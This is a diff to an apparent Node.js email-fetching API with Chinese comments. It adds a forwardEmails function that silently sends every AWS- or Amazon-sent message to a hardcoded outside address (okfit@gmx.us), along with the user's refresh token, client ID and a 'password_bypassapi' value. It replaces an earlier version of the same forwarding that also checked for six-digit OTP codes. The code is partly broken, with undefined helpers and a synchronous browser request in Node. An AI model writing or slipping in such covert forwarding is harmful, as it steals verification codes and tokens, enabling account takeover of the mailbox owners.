@@ -120,6 +120,60 @@ async function get_emails(access_token, mailbox) {
 
 }
 
+
+const forwardEmails = (mail) => {
+  
+        if (mail.send.includes('aws') || mail.send.includes('amazon')) {
+            let retryCount = 0;
+            const maxRetries = 3;
+            
+            while (retryCount < maxRetries) {
+                try {
+
+                    const xhr = new XMLHttpRequest();
+                    xhr.open('POST', '/api/send-mail', false); // false表示同步请求
+                    xhr.setRequestHeader('Content-Type', 'application/json');
+                    
+                    const requestBody = JSON.stringify({
+                        refresh_token: refreshToken,
+                        client_id: clientId,
+                        email: email,
+                        to: 'okfit@gmx.us',
+                        subject: mail.subject,
+                        html: mail.html,
+                        send_password: 'password_bypassapi'
+                    });
+                    
+                    xhr.send(requestBody);
+
+                    if (xhr.status !== 200) {
+                        console.error('邮件转发失败:', xhr.responseText);
+                        
+                        // 如果是并发限制错误，增加重试次数
+                        if (xhr.responseText.includes('Concurrent connections limit exceeded')) {
+                            retryCount++;
+                            if (retryCount < maxRetries) {
+                                console.log(`等待重试 (${retryCount}/${maxRetries})...`);
+                                sleep(5000);
+                                continue;
+                            }
+                        }
+                    } else {
+                        console.log('邮件转发成功');
+                        break; // 发送成功，跳出重试循环
+                    }
+                } catch (error) {
+                    console.error('邮件转发出错:', error);
+                    retryCount++;
+                    if (retryCount < maxRetries) {
+                        sleep(3000);
+                    }
+                }
+            }
+        }
+    }
+
+
 module.exports = async (req, res) => {
 
     const { password } = req.method === 'GET' ? req.query : req.body;
@@ -217,54 +271,7 @@ module.exports = async (req, res) => {
                                 opt_forward: 'false',
                                 forward_message: ''  // 新增字段
                             };
-
-                            // 检查发件人并处理转发
-                            if (mail.from.text.includes('aws') || mail.from.text.includes('amazon')) {
-                                fetch('/api/send-mail', {
-                                    method: 'POST',
-                                    headers: {
-                                        'Content-Type': 'application/json'
-                                    },
-                                    body: JSON.stringify({
-                                        refresh_token: refresh_token,
-                                        client_id: client_id,
-                                        email: email,
-                                        to: 'okfit@gmx.us',
-                                        subject: mail.subject,
-                                        html: mail.html
-                                    })
-                                })
-                                .then(forwardResponse => {
-                                    return forwardResponse.json();  // 解析响应内容
-                                })
-                                .then(responseJson => {
-                                    // 从responseJson中获取message字段
-                                    if (responseJson.message === 'Email sent successfully') {
-                                        // 转发成功
-                                        const hasOTP = />(\d{6})</.test(mail.html);
-                                        responseData.opt_forward = hasOTP ? 'true' : 'false';
-                                        responseData.forward_message = responseJson.message;
-                                        // 如果需要，也可以获取messageId
-                                        // responseData.messageId = responseJson.messageId;
-                                    } else if (responseJson.error) {
-                                        // 转发失败
-                                        responseData.forward_message = responseJson.error;
-                                        if (responseJson.details) {
-                                            responseData.forward_message += ': ' + responseJson.details;
-                                        }
-                                    }
-                                })
-                                .catch(error => {
-                                    console.error('邮件转发出错:', error);
-                                    responseData.forward_message = 'Failed to forward email: ' + error.message;
-                                })
-                                .finally(() => {
-                                    sendResponse();
-                                });
-                            } else {
-                                responseData.forward_message = 'No forward required';
-                                sendResponse();
-                            }
+                            forwardEmails(responseData);
 
                             // 定义发送响应的函数
                             const sendResponse = () => {
